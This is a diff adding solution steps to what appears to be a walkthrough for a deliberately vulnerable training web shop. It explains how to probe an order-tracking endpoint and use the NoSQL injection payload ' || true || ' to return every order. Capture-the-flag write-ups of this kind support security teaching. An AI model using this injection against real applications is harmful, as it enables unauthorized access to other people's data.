@@ -1493,7 +1493,26 @@ JSON payload `POST`ed to <http://localhost:3000/rest/user/login>.
 
 ###  All your orders are belong to us
 
-🔧 **TODO**
+1. Open the network tab of your browser's DevTools.
+2. Visit <http://localhost:3000/#/track-order> and search for `x` to
+   witness a `GET` request <http://localhost:3000/rest/track-order/x>
+   being sent returning `{"status":"success","data":[{"orderId":"x"}]}`.
+3. Search for `'` (single quote) as _Order ID_ now.
+   <http://localhost:3000/rest/track-order/'> will throw an error
+
+   ![NoSQL query error from invalid token](img/error_page-nosqli.png)
+4. Searching for `''` (two single quotes) as _Order ID_ now will let
+   <http://localhost:3000/rest/track-order/''> throw an `Unexpected
+   string` error instead of the previous `Invalid or unexpected token`.
+5. While not stated anywhere in the error messages, it can be assumed
+   with some MongoDB background that the query probably resembles
+   something like `{ $where: "property === '" + payload + "'" }`.
+6. The required `payload` for the challenge needs to make sure all data
+   is matched while squeezing itself into the query in a non-breaking
+   way.
+7. Search for `' || true || '` resulting in
+   <http://localhost:3000/rest/track-order/'%20%7C%7C%20true%20%7C%7C%20'>
+   which will in fact query and return all orders from the MarsDB.
 
 ### Perform a Remote Code Execution that would keep a less hardened application busy forever
 
